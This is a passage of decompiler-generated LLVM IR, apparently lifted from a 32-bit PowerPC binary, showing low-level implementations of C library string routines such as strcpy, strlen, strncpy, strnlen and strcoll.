  %v2_10009ec4 = inttoptr i32 %v0_10009edc to i8*
  %v3_10009ec4 = load i8, i8* %v2_10009ec4, align 1
  %v4_10009ec4 = zext i8 %v3_10009ec4 to i32
  %v1_10009ec8 = add i32 %v0_10009edc, 2
  %v1_10009ecc = add i32 %v0_10009edc, 3
  %v4_10009ed0 = icmp eq i32 %v4_10009ec4, %v0_10009e6c
  br i1 %v4_10009ed0, label %dec_label_pc_10009edc, label %dec_label_pc_10009ee4

dec_label_pc_10009edc:                            ; preds = %dec_label_pc_10009ec4
  ret i32 %v0_10009edc

dec_label_pc_10009ee4:                            ; preds = %dec_label_pc_10009ec4
  %v3_10009ed4 = icmp eq i8 %v3_10009ec4, 0
  br i1 %v3_10009ed4, label %dec_label_pc_10009f3c, label %dec_label_pc_10009ee8

dec_label_pc_10009ee8:                            ; preds = %dec_label_pc_10009ee4
  %v2_10009ee8 = inttoptr i32 %v1_10009eb8 to i8*
  %v3_10009ee8 = load i8, i8* %v2_10009ee8, align 1
  %v4_10009ee8 = zext i8 %v3_10009ee8 to i32
  %v4_10009eec = icmp eq i32 %v4_10009ee8, %v0_10009e6c
  br i1 %v4_10009eec, label %dec_label_pc_10009ef8, label %dec_label_pc_10009f00

dec_label_pc_10009ef8:                            ; preds = %dec_label_pc_10009ee8
  ret i32 %v1_10009eb8

dec_label_pc_10009f00:                            ; preds = %dec_label_pc_10009ee8
  %v3_10009ef0 = icmp eq i8 %v3_10009ee8, 0
  br i1 %v3_10009ef0, label %dec_label_pc_10009f3c, label %dec_label_pc_10009f04

dec_label_pc_10009f04:                            ; preds = %dec_label_pc_10009f00
  %v2_10009f04 = inttoptr i32 %v1_10009ec8 to i8*
  %v3_10009f04 = load i8, i8* %v2_10009f04, align 1
  %v4_10009f04 = zext i8 %v3_10009f04 to i32
  %v4_10009f08 = icmp eq i32 %v4_10009f04, %v0_10009e6c
  br i1 %v4_10009f08, label %dec_label_pc_10009f14, label %dec_label_pc_10009f1c

dec_label_pc_10009f14:                            ; preds = %dec_label_pc_10009f04
  ret i32 %v1_10009ec8

dec_label_pc_10009f1c:                            ; preds = %dec_label_pc_10009f04
  %v3_10009f0c = icmp eq i8 %v3_10009f04, 0
  br i1 %v3_10009f0c, label %dec_label_pc_10009f3c, label %dec_label_pc_10009f20

dec_label_pc_10009f20:                            ; preds = %dec_label_pc_10009f1c
  %v2_10009f20 = inttoptr i32 %v1_10009ecc to i8*
  %v3_10009f20 = load i8, i8* %v2_10009f20, align 1
  %v4_10009f20 = zext i8 %v3_10009f20 to i32
  %v4_10009f24 = icmp eq i32 %v4_10009f20, %v0_10009e6c
  br i1 %v4_10009f24, label %dec_label_pc_10009f30, label %dec_label_pc_10009f38

dec_label_pc_10009f30:                            ; preds = %dec_label_pc_10009f20
  ret i32 %v1_10009ecc

dec_label_pc_10009f38:                            ; preds = %dec_label_pc_10009f20
  %v3_10009f28 = icmp eq i8 %v3_10009f20, 0
  br i1 %v3_10009f28, label %dec_label_pc_10009f3c, label %dec_label_pc_10009e84

dec_label_pc_10009f3c:                            ; preds = %dec_label_pc_10009e4c, %dec_label_pc_10009f38, %dec_label_pc_10009f1c, %dec_label_pc_10009f00, %dec_label_pc_10009ee4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10009e88, { 1, 0 }
  uselistorder i32 %v2_10009e84, { 0, 2, 1 }
  uselistorder i32 %v0_10009edc, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_10009e74, { 1, 0 }
  uselistorder i32 %v0_10009e6c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10009e60, { 1, 0, 3, 2 }
  uselistorder i32 %v0_10009e642, { 2, 1, 0 }
  uselistorder i32 %v1_10009e44, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009f3c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10009e84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009e4c, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10009f50.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10009f48

dec_label_pc_10009f48:                            ; preds = %dec_label_pc_10009f6c, %entry
  %v0_10009f50 = phi i32 [ %v1_10009f54, %dec_label_pc_10009f6c ], [ %v0_10009f50.pre, %entry ]
  %v0_10009f48 = phi i32 [ %v1_10009f4c, %dec_label_pc_10009f6c ], [ %tmp, %entry ]
  %v1_10009f48 = inttoptr i32 %v0_10009f48 to i8*
  %v2_10009f48 = load i8, i8* %v1_10009f48, align 1
  %v3_10009f48 = zext i8 %v2_10009f48 to i32
  %v1_10009f50 = inttoptr i32 %v0_10009f50 to i8*
  %v2_10009f50 = load i8, i8* %v1_10009f50, align 1
  %v3_10009f50 = zext i8 %v2_10009f50 to i32
  %v3_10009f58 = icmp eq i8 %v2_10009f48, 0
  br i1 %v3_10009f58, label %dec_label_pc_10009f64, label %dec_label_pc_10009f6c

dec_label_pc_10009f64:                            ; preds = %dec_label_pc_10009f48
  %v1_10009f64 = sub nsw i32 0, %v3_10009f50
  ret i32 %v1_10009f64

dec_label_pc_10009f6c:                            ; preds = %dec_label_pc_10009f48
  %v4_10009f5c = icmp eq i8 %v2_10009f48, %v2_10009f50
  %v1_10009f54 = add i32 %v0_10009f50, 1
  %v1_10009f4c = add i32 %v0_10009f48, 1
  br i1 %v4_10009f5c, label %dec_label_pc_10009f48, label %dec_label_pc_10009f70

dec_label_pc_10009f70:                            ; preds = %dec_label_pc_10009f6c
  %v2_10009f70 = sub nsw i32 %v3_10009f48, %v3_10009f50
  ret i32 %v2_10009f70

; uselistorder directives
  uselistorder i32 %v3_10009f50, { 1, 0 }
  uselistorder i32 %v0_10009f48, { 1, 0 }
  uselistorder i32 %v0_10009f50, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10009f78 = add i32 %arg1, -1
  %v1_10009f7c = sub i32 %v2_10009f78, %tmp
  store i32 %v1_10009f7c, i32* %r9.global-to-local, align 4
  %v2_10009f804 = load i8, i8* %arg2, align 1
  %v1_10009f846 = add i32 %tmp, 1
  store i32 %v1_10009f846, i32* %r4.global-to-local, align 4
  %v3_10009f888 = icmp eq i8 %v2_10009f804, 0
  store i1 %v3_10009f888, i1* %cr7_eq.global-to-local, align 1
  %v5_10009f8c9 = inttoptr i32 %arg1 to i8*
  store i8 %v2_10009f804, i8* %v5_10009f8c9, align 1
  %v0_10009f9010 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009f9010, label %dec_label_pc_10009f94, label %dec_label_pc_10009f80.dec_label_pc_10009f80_crit_edge

dec_label_pc_10009f80.dec_label_pc_10009f80_crit_edge: ; preds = %entry, %dec_label_pc_10009f80.dec_label_pc_10009f80_crit_edge
  %v0_10009f80.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_10009f8c.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10009f80 = inttoptr i32 %v0_10009f80.pre to i8*
  %v2_10009f80 = load i8, i8* %v1_10009f80, align 1
  %v1_10009f84 = add i32 %v0_10009f80.pre, 1
  store i32 %v1_10009f84, i32* %r4.global-to-local, align 4
  %v3_10009f88 = icmp eq i8 %v2_10009f80, 0
  store i1 %v3_10009f88, i1* %cr7_eq.global-to-local, align 1
  %v4_10009f8c = add i32 %v1_10009f84, %v2_10009f8c.pre
  %v5_10009f8c = inttoptr i32 %v4_10009f8c to i8*
  store i8 %v2_10009f80, i8* %v5_10009f8c, align 1
  %v0_10009f90 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009f90, label %dec_label_pc_10009f94, label %dec_label_pc_10009f80.dec_label_pc_10009f80_crit_edge

dec_label_pc_10009f94:                            ; preds = %dec_label_pc_10009f80.dec_label_pc_10009f80_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009f80.dec_label_pc_10009f80_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_10009f98 = load i32, i32* @r3, align 4
  %v1_10009fb03 = urem i32 %v0_10009f98, 4
  %v3_10009fb05 = icmp eq i32 %v1_10009fb03, 0
  br i1 %v3_10009fb05, label %dec_label_pc_10009fb8, label %dec_label_pc_10009fa0

dec_label_pc_10009fa0:                            ; preds = %entry, %dec_label_pc_10009fac
  %v0_10009fac = phi i32 [ %v1_10009fac, %dec_label_pc_10009fac ], [ %v0_10009f98, %entry ]
  %v1_10009fa0 = inttoptr i32 %v0_10009fac to i8*
  %v2_10009fa0 = load i8, i8* %v1_10009fa0, align 1
  %v3_10009fa4 = icmp eq i8 %v2_10009fa0, 0
  br i1 %v3_10009fa4, label %dec_label_pc_10009fec, label %dec_label_pc_10009fac

dec_label_pc_10009fac:                            ; preds = %dec_label_pc_10009fa0
  %v1_10009fac = add i32 %v0_10009fac, 1
  %v1_10009fb0 = urem i32 %v1_10009fac, 4
  %v3_10009fb0 = icmp eq i32 %v1_10009fb0, 0
  br i1 %v3_10009fb0, label %dec_label_pc_10009fb8, label %dec_label_pc_10009fa0

dec_label_pc_10009fb8:                            ; preds = %dec_label_pc_10009fac, %entry
  %v0_10009fbc = phi i32 [ %v0_10009f98, %entry ], [ %v1_10009fac, %dec_label_pc_10009fac ]
  store i32 -2139062144, i32* @r8, align 4
  br label %dec_label_pc_10009fc4

dec_label_pc_10009fc4:                            ; preds = %dec_label_pc_1000a024, %dec_label_pc_10009fc4, %dec_label_pc_10009fb8
  %v1_1000a000 = phi i32 [ %v0_10009fbc, %dec_label_pc_10009fb8 ], [ %v1_10009fc8, %dec_label_pc_10009fc4 ], [ %v1_10009fc8, %dec_label_pc_1000a024 ]
  %v1_10009fc4 = inttoptr i32 %v1_1000a000 to i32*
  %v2_10009fc4 = load i32, i32* %v1_10009fc4, align 4
  %v1_10009fc8 = add i32 %v1_1000a000, 4
  %v1_10009fd4 = add i32 %v2_10009fc4, -16843009
  %v2_10009fd8 = and i32 %v1_10009fd4, -2139062144
  %v5_10009fd8 = icmp eq i32 %v2_10009fd8, 0
  br i1 %v5_10009fd8, label %dec_label_pc_10009fc4, label %dec_label_pc_10009fe0

dec_label_pc_10009fe0:                            ; preds = %dec_label_pc_10009fc4
  %v2_10009fe0 = inttoptr i32 %v1_1000a000 to i8*
  %v3_10009fe0 = load i8, i8* %v2_10009fe0, align 1
  %v3_10009fe4 = icmp eq i8 %v3_10009fe0, 0
  br i1 %v3_10009fe4, label %dec_label_pc_10009fec, label %dec_label_pc_10009ff4

dec_label_pc_10009fec:                            ; preds = %dec_label_pc_10009fa0, %dec_label_pc_10009fe0
  %v1_10009fec = phi i32 [ %v1_1000a000, %dec_label_pc_10009fe0 ], [ %v0_10009fac, %dec_label_pc_10009fa0 ]
  %v2_10009fec = sub i32 %v1_10009fec, %v0_10009f98
  ret i32 %v2_10009fec

dec_label_pc_10009ff4:                            ; preds = %dec_label_pc_10009fe0
  %v1_10009ff4 = add i32 %v1_1000a000, 1
  %v2_10009ff4 = inttoptr i32 %v1_10009ff4 to i8*
  %v3_10009ff4 = load i8, i8* %v2_10009ff4, align 1
  %v3_10009ff8 = icmp eq i8 %v3_10009ff4, 0
  br i1 %v3_10009ff8, label %dec_label_pc_1000a000, label %dec_label_pc_1000a00c

dec_label_pc_1000a000:                            ; preds = %dec_label_pc_10009ff4
  %v2_1000a000 = sub i32 %v1_1000a000, %v0_10009f98
  %v1_1000a004 = add i32 %v2_1000a000, 1
  ret i32 %v1_1000a004

dec_label_pc_1000a00c:                            ; preds = %dec_label_pc_10009ff4
  %v1_1000a00c = add i32 %v1_1000a000, 2
  %v2_1000a00c = inttoptr i32 %v1_1000a00c to i8*
  %v3_1000a00c = load i8, i8* %v2_1000a00c, align 1
  %v3_1000a010 = icmp eq i8 %v3_1000a00c, 0
  br i1 %v3_1000a010, label %dec_label_pc_1000a018, label %dec_label_pc_1000a024

dec_label_pc_1000a018:                            ; preds = %dec_label_pc_1000a00c
  %v2_1000a018 = sub i32 %v1_1000a000, %v0_10009f98
  %v1_1000a01c = add i32 %v2_1000a018, 2
  ret i32 %v1_1000a01c

dec_label_pc_1000a024:                            ; preds = %dec_label_pc_1000a00c
  %v1_1000a024 = add i32 %v1_1000a000, 3
  %v2_1000a024 = inttoptr i32 %v1_1000a024 to i8*
  %v3_1000a024 = load i8, i8* %v2_1000a024, align 1
  %v3_1000a028 = icmp eq i8 %v3_1000a024, 0
  br i1 %v3_1000a028, label %dec_label_pc_1000a030, label %dec_label_pc_10009fc4

dec_label_pc_1000a030:                            ; preds = %dec_label_pc_1000a024
  %v2_1000a030 = sub i32 %v1_1000a000, %v0_10009f98
  %v1_1000a034 = add i32 %v2_1000a030, 3
  ret i32 %v1_1000a034

; uselistorder directives
  uselistorder i32 %v1_10009fc8, { 1, 0 }
  uselistorder i32 %v1_1000a000, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_10009fac, { 1, 0, 2 }
  uselistorder i32 %v0_10009f98, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10009fec, { 1, 0 }
  uselistorder label %dec_label_pc_10009fa0, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000a03c = icmp eq i32 %arg2, 3
  store i1 %v3_1000a03c, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a040 = add i32 %arg1, -1
  store i32 %v1_1000a040, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1000a0bc, label %dec_label_pc_1000a048

dec_label_pc_1000a048:                            ; preds = %entry
  %v1_1000a048 = udiv i32 %arg2, 4
  store i32 %v1_1000a048, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a050

dec_label_pc_1000a050:                            ; preds = %dec_label_pc_1000a0a0, %dec_label_pc_1000a048
  %v2_1000a060 = phi i32 [ %v3_1000a098, %dec_label_pc_1000a0a0 ], [ %v1_1000a040, %dec_label_pc_1000a048 ]
  %v0_1000a050 = load i32, i32* @r4, align 4
  %v1_1000a050 = inttoptr i32 %v0_1000a050 to i8*
  %v2_1000a050 = load i8, i8* %v1_1000a050, align 1
  %v1_1000a054 = add i32 %v0_1000a050, 1
  store i32 %v1_1000a054, i32* %r10.global-to-local, align 4
  %v1_1000a058 = add i32 %v0_1000a050, 2
  store i32 %v1_1000a058, i32* @r8, align 4
  %v3_1000a05c = icmp eq i8 %v2_1000a050, 0
  store i1 %v3_1000a05c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a060 = add i32 %v2_1000a060, 1
  %v4_1000a060 = inttoptr i32 %v3_1000a060 to i8*
  store i8 %v2_1000a050, i8* %v4_1000a060, align 1
  store i32 %v3_1000a060, i32* %r11.global-to-local, align 4
  %v0_1000a064 = load i32, i32* @r8, align 4
  %v1_1000a064 = add i32 %v0_1000a064, 1
  store i32 %v1_1000a064, i32* %r9.global-to-local, align 4
  %v0_1000a068 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a068, label %dec_label_pc_1000a0a8, label %dec_label_pc_1000a06c

dec_label_pc_1000a06c:                            ; preds = %dec_label_pc_1000a050
  %v0_1000a06c = load i32, i32* @r4, align 4
  %v1_1000a06c = add i32 %v0_1000a06c, 1
  %v2_1000a06c = inttoptr i32 %v1_1000a06c to i8*
  %v3_1000a06c = load i8, i8* %v2_1000a06c, align 1
  %v1_1000a070 = add i32 %v0_1000a064, 2
  store i32 %v1_1000a070, i32* @r4, align 4
  %v3_1000a074 = icmp eq i8 %v3_1000a06c, 0
  store i1 %v3_1000a074, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a078 = add i32 %v2_1000a060, 2
  %v4_1000a078 = inttoptr i32 %v3_1000a078 to i8*
  store i8 %v3_1000a06c, i8* %v4_1000a078, align 1
  store i32 %v3_1000a078, i32* %r11.global-to-local, align 4
  %v0_1000a07c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a07c, label %dec_label_pc_1000a0a8, label %dec_label_pc_1000a080

dec_label_pc_1000a080:                            ; preds = %dec_label_pc_1000a06c
  %v0_1000a080 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a080 = add i32 %v0_1000a080, 1
  %v2_1000a080 = inttoptr i32 %v1_1000a080 to i8*
  %v3_1000a080 = load i8, i8* %v2_1000a080, align 1
  %v3_1000a084 = icmp eq i8 %v3_1000a080, 0
  store i1 %v3_1000a084, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a088 = add i32 %v2_1000a060, 3
  %v4_1000a088 = inttoptr i32 %v3_1000a088 to i8*
  store i8 %v3_1000a080, i8* %v4_1000a088, align 1
  store i32 %v3_1000a088, i32* %r11.global-to-local, align 4
  %v0_1000a08c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a08c, label %dec_label_pc_1000a0a8, label %dec_label_pc_1000a090

dec_label_pc_1000a090:                            ; preds = %dec_label_pc_1000a080
  %v0_1000a090 = load i32, i32* @r8, align 4
  %v1_1000a090 = add i32 %v0_1000a090, 1
  %v2_1000a090 = inttoptr i32 %v1_1000a090 to i8*
  %v3_1000a090 = load i8, i8* %v2_1000a090, align 1
  %v3_1000a094 = icmp eq i8 %v3_1000a090, 0
  store i1 %v3_1000a094, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a098 = add i32 %v2_1000a060, 4
  %v4_1000a098 = inttoptr i32 %v3_1000a098 to i8*
  store i8 %v3_1000a090, i8* %v4_1000a098, align 1
  store i32 %v3_1000a098, i32* %r11.global-to-local, align 4
  %v0_1000a09c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a09c, label %dec_label_pc_1000a0a8, label %dec_label_pc_1000a0a0

dec_label_pc_1000a0a0:                            ; preds = %dec_label_pc_1000a090
  %v0_1000a0a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a0a0 = add i32 %v0_1000a0a0, -1
  store i32 %v1_1000a0a0, i32* %ctr.global-to-local, align 4
  %v2_1000a0a0 = icmp eq i32 %v1_1000a0a0, 0
  br i1 %v2_1000a0a0, label %dec_label_pc_1000a0bc, label %dec_label_pc_1000a050

dec_label_pc_1000a0a8:                            ; preds = %dec_label_pc_1000a090, %dec_label_pc_1000a080, %dec_label_pc_1000a06c, %dec_label_pc_1000a050
  %v1_1000a0a8 = phi i32 [ %v3_1000a098, %dec_label_pc_1000a090 ], [ %v3_1000a088, %dec_label_pc_1000a080 ], [ %v3_1000a078, %dec_label_pc_1000a06c ], [ %v3_1000a060, %dec_label_pc_1000a050 ]
  %v2_1000a0a811 = sub i32 %arg1, %v1_1000a0a8
  %v2_1000a0ac = add i32 %v2_1000a0a811, %arg2
  %v1_1000a0b0 = add i32 %v2_1000a0ac, -1
  store i32 %v1_1000a0b0, i32* %r9.global-to-local, align 4
  %v4_1000a0b0 = icmp eq i32 %v1_1000a0b0, 0
  %v0_1000a0b4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a0b0, i32 %v0_1000a0b4)
  %v2_1000a0ec.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a0e4

dec_label_pc_1000a0bc:                            ; preds = %dec_label_pc_1000a0a0, %entry
  %v1_1000a0bc = urem i32 %arg2, 4
  store i32 %v1_1000a0bc, i32* %r9.global-to-local, align 4
  %v3_1000a0bc = icmp eq i32 %v1_1000a0bc, 0
  %v0_1000a0c0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a0bc, i32 %v0_1000a0c0)
  store i32 %v1_1000a0bc, i32* %ctr.global-to-local, align 4
  %v2_1000a0d8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a0c8

dec_label_pc_1000a0c8:                            ; preds = %dec_label_pc_1000a0e0.dec_label_pc_1000a0c8_crit_edge, %dec_label_pc_1000a0bc
  %v2_1000a0d8 = phi i32 [ %v3_1000a0d8, %dec_label_pc_1000a0e0.dec_label_pc_1000a0c8_crit_edge ], [ %v2_1000a0d8.pre, %dec_label_pc_1000a0bc ]
  %v0_1000a0cc = phi i32 [ %v0_1000a0cc.pre, %dec_label_pc_1000a0e0.dec_label_pc_1000a0c8_crit_edge ], [ %v1_1000a0bc, %dec_label_pc_1000a0bc ]
  %v0_1000a0c8 = load i32, i32* @r4, align 4
  %v1_1000a0c8 = inttoptr i32 %v0_1000a0c8 to i8*
  %v2_1000a0c8 = load i8, i8* %v1_1000a0c8, align 1
  %v1_1000a0cc = add i32 %v0_1000a0cc, -1
  store i32 %v1_1000a0cc, i32* %r9.global-to-local, align 4
  %v1_1000a0d0 = add i32 %v0_1000a0c8, 1
  store i32 %v1_1000a0d0, i32* @r4, align 4
  %v3_1000a0d4 = icmp eq i8 %v2_1000a0c8, 0
  store i1 %v3_1000a0d4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a0d8 = add i32 %v2_1000a0d8, 1
  %v4_1000a0d8 = inttoptr i32 %v3_1000a0d8 to i8*
  store i8 %v2_1000a0c8, i8* %v4_1000a0d8, align 1
  store i32 %v3_1000a0d8, i32* %r11.global-to-local, align 4
  %v0_1000a0dc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a0dc = add i32 %v0_1000a0dc, -1
  store i32 %v1_1000a0dc, i32* %ctr.global-to-local, align 4
  %v2_1000a0dc = icmp eq i32 %v1_1000a0dc, 0
  br i1 %v2_1000a0dc, label %dec_label_pc_1000a0f4, label %dec_label_pc_1000a0e0

dec_label_pc_1000a0e0:                            ; preds = %dec_label_pc_1000a0c8
  %v0_1000a0e0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a0e0, label %dec_label_pc_1000a0e4, label %dec_label_pc_1000a0e0.dec_label_pc_1000a0c8_crit_edge

dec_label_pc_1000a0e0.dec_label_pc_1000a0c8_crit_edge: ; preds = %dec_label_pc_1000a0e0
  %v0_1000a0cc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a0c8

dec_label_pc_1000a0e4:                            ; preds = %dec_label_pc_1000a0e0, %dec_label_pc_1000a0a8
  %v2_1000a0ec.pre = phi i32 [ %v2_1000a0ec.pre.pre, %dec_label_pc_1000a0a8 ], [ %v3_1000a0d8, %dec_label_pc_1000a0e0 ]
  %v0_1000a0e4 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000a0e4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a0e8

dec_label_pc_1000a0e8:                            ; preds = %dec_label_pc_1000a0e8, %dec_label_pc_1000a0e4
  %v2_1000a0ec = phi i32 [ %v3_1000a0ec, %dec_label_pc_1000a0e8 ], [ %v2_1000a0ec.pre, %dec_label_pc_1000a0e4 ]
  %v3_1000a0ec = add i32 %v2_1000a0ec, 1
  %v4_1000a0ec = inttoptr i32 %v3_1000a0ec to i8*
  store i8 0, i8* %v4_1000a0ec, align 1
  store i32 %v3_1000a0ec, i32* %r11.global-to-local, align 4
  %v0_1000a0f0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a0f0 = add i32 %v0_1000a0f0, -1
  store i32 %v1_1000a0f0, i32* %ctr.global-to-local, align 4
  %v2_1000a0f0 = icmp eq i32 %v1_1000a0f0, 0
  br i1 %v2_1000a0f0, label %dec_label_pc_1000a0f4, label %dec_label_pc_1000a0e8

dec_label_pc_1000a0f4:                            ; preds = %dec_label_pc_1000a0c8, %dec_label_pc_1000a0e8
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000a0f0, { 1, 0 }
  uselistorder i32 %v3_1000a0ec, { 1, 2, 0 }
  uselistorder i32 %v1_1000a0dc, { 1, 0 }
  uselistorder i32 %v3_1000a0d8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000a0bc, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000a0a0, { 1, 0 }
  uselistorder i32 %v3_1000a098, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a0f4, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000a0f8 = load i32, i32* @r4, align 4
  %v3_1000a0f8 = icmp eq i32 %v0_1000a0f8, 0
  %v0_1000a104 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a0f8, i32 %v0_1000a104)
  %v1_1000a114 = load i32, i32* @r4, align 4
  %v2_1000a114 = add i32 %v1_1000a114, %tmp
  %v3_1000a118 = icmp ugt i32 %v2_1000a114, %tmp
  %v4_1000a118 = icmp eq i32 %v1_1000a114, 0
  %v2_1000a11c = or i1 %v4_1000a118, %v3_1000a118
  br i1 %v2_1000a11c, label %dec_label_pc_1000a124, label %dec_label_pc_1000a120

dec_label_pc_1000a10c:                            ; preds = %dec_label_pc_1000a18c
  br label %dec_label_pc_1000a1d0

dec_label_pc_1000a120:                            ; preds = %entry
  br label %dec_label_pc_1000a124

dec_label_pc_1000a124:                            ; preds = %entry, %dec_label_pc_1000a120
  %v0_1000a1d4 = phi i32 [ %v2_1000a114, %entry ], [ -1, %dec_label_pc_1000a120 ]
  %v1_1000a1546 = urem i32 %tmp, 4
  %v3_1000a1548 = icmp eq i32 %v1_1000a1546, 0
  br i1 %v3_1000a1548, label %dec_label_pc_1000a15c, label %dec_label_pc_1000a12c

dec_label_pc_1000a12c:                            ; preds = %dec_label_pc_1000a124, %dec_label_pc_1000a150
  %v0_1000a144 = phi i32 [ %v1_1000a150, %dec_label_pc_1000a150 ], [ %tmp, %dec_label_pc_1000a124 ]
  %v1_1000a12c = inttoptr i32 %v0_1000a144 to i8*
  %v2_1000a12c = load i8, i8* %v1_1000a12c, align 1
  %v3_1000a130 = icmp eq i8 %v2_1000a12c, 0
  br i1 %v3_1000a130, label %dec_label_pc_1000a138, label %dec_label_pc_1000a150

dec_label_pc_1000a138:                            ; preds = %dec_label_pc_1000a12c
  %v3_1000a138 = icmp ugt i32 %v0_1000a1d4, %v0_1000a144
  %v0_1000a144.v0_1000a1d4 = select i1 %v3_1000a138, i32 %v0_1000a144, i32 %v0_1000a1d4
  %v2_1000a148 = sub i32 %v0_1000a144.v0_1000a1d4, %tmp
  ret i32 %v2_1000a148

dec_label_pc_1000a150:                            ; preds = %dec_label_pc_1000a12c
  %v1_1000a150 = add i32 %v0_1000a144, 1
  %v1_1000a154 = urem i32 %v1_1000a150, 4
  %v3_1000a154 = icmp eq i32 %v1_1000a154, 0
  br i1 %v3_1000a154, label %dec_label_pc_1000a15c, label %dec_label_pc_1000a12c

dec_label_pc_1000a15c:                            ; preds = %dec_label_pc_1000a150, %dec_label_pc_1000a124
  %v0_1000a160 = phi i32 [ %tmp, %dec_label_pc_1000a124 ], [ %v1_1000a150, %dec_label_pc_1000a150 ]
  store i32 -2139062144, i32* @r7, align 4
  %v2_1000a1c83 = icmp ult i32 %v0_1000a160, %v0_1000a1d4
  br i1 %v2_1000a1c83, label %dec_label_pc_1000a16c, label %dec_label_pc_1000a1d0

dec_label_pc_1000a16c:                            ; preds = %dec_label_pc_1000a15c, %dec_label_pc_1000a1c4
  %v0_1000a10c = phi i32 [ %v1_1000a170, %dec_label_pc_1000a1c4 ], [ %v0_1000a160, %dec_label_pc_1000a15c ]
  %v1_1000a16c = inttoptr i32 %v0_1000a10c to i32*
  %v2_1000a16c = load i32, i32* %v1_1000a16c, align 4
  %v1_1000a170 = add i32 %v0_1000a10c, 4
  store i32 %v0_1000a10c, i32* @r8, align 4
  %v1_1000a17c = add i32 %v2_1000a16c, -16843009
  %v2_1000a180 = and i32 %v1_1000a17c, -2139062144
  %v5_1000a180 = icmp eq i32 %v2_1000a180, 0
  %v1_1000a184 = add i32 %v0_1000a10c, 1
  br i1 %v5_1000a180, label %dec_label_pc_1000a1c4, label %dec_label_pc_1000a18c

dec_label_pc_1000a18c:                            ; preds = %dec_label_pc_1000a16c
  %v2_1000a18c = inttoptr i32 %v0_1000a10c to i8*
  %v3_1000a18c = load i8, i8* %v2_1000a18c, align 1
  %v3_1000a190 = icmp eq i8 %v3_1000a18c, 0
  br i1 %v3_1000a190, label %dec_label_pc_1000a10c, label %dec_label_pc_1000a198

dec_label_pc_1000a198:                            ; preds = %dec_label_pc_1000a18c
  %v2_1000a198 = inttoptr i32 %v1_1000a184 to i8*
  %v3_1000a198 = load i8, i8* %v2_1000a198, align 1
  %v3_1000a19c = icmp eq i8 %v3_1000a198, 0
